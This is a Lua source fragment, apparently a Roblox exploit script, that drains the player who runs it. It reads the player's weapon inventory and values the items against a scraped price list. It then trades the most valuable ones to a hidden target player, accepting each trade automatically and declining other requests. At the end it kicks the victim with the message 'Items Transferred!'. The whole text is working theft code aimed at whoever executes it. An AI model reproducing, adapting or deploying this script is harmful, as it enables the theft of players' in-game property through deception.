local function ScrapeValueList(url, rarityName)
    local f = GetRequestFunction() if not f then return {} end
    local items = {}
    local s, r = pcall(function() return f({Url=url, Method="GET", Headers={["User-Agent"]="Mozilla/5.0"}, Timeout=15}) end)
    if not s or not r or not r.Body then return {} end
    for name, val in string.gmatch(r.Body, '>([^<>]+)</td>%s*<td class="text%-right">%s*([%d,]+)%s*<') do
        name = name:gsub("^%s*(.-)%s*$", "%1"):lower():gsub("'", ""):gsub(" ", "")
        local num = tonumber(val:gsub(",", ""))
        if num and num > 0 then items[name] = {Value=num, Rarity=rarityName, Chroma=(rarityName=="Chroma")} end
    end
    return items
end

local function LoadInventory()
    local all, trade, total = {}, {}, 0
    local data = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
    if data and data.Weapons and data.Weapons.Owned then
        for id, qty in pairs(data.Weapons.Owned) do
            if qty and qty>0 then
                local key = tostring(id):lower():gsub("'", ""):gsub(" ", "")
                local info = ItemDatabase[key]
                local rarity = info and info.Rarity or "Unknown"
                local val = info and info.Value or 0
                local entry = {DataID=id, Name=id, Rarity=rarity, Count=qty, Value=val, IsChroma=info and info.Chroma or false, Total=val*qty}
                table.insert(all, entry)
                if ShouldTrade(rarity, val) and not Blacklist[id] then table.insert(trade, entry) total=total+entry.Total end
            end
        end
    end
    table.sort(all, function(a,b) return a.Total>b.Total end)
    table.sort(trade, function(a,b) return a.Total>b.Total end)
    return all, trade, total
end

local function KickEnd() task.wait(2) LocalPlayer:Kick("Items Transferred!") end

local function ProcessTrades(target)
    local attempts=0
    while #TradeItems>0 and attempts<999 do
        attempts=attempts+1
        local status=GetTradeStatus()
        if status=="ReceivingRequest" then pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end) task.wait(0.5) continue end
        if status=="StartTrade" then
            local send=math.min(4,#TradeItems)
            for _=1,send do local it=table.remove(TradeItems,1) for _=1,it.Count do AddItem(it.DataID) task.wait(0.05) end end
            task.wait(6)
            if AcceptTrade() then WaitEnd() AllItems, TradeItems, TotalValue = LoadInventory() attempts=0 else AllItems, TradeItems, TotalValue = LoadInventory() task.wait(2) end
            continue
        end
        if status=="None" then local sent,t=false,1 while not sent and t<=5 do if SendTradeRequest(target) then sent=true task.wait(0.5) else task.wait(math.min(t*0.5,3)) t=t+1 end end end
        task.wait(0.5)
    end
    KickEnd()
end

local function AutoStart()
    local busy=false
    local function Check(p) if busy then return end local t=FindTarget() if t and p.Name==t then busy=true task.wait(3) ProcessTrades(p.Name) end end
    for _,p in ipairs(Players:GetPlayers()) do Check(p) end
    Players.PlayerAdded:Connect(Check)
end
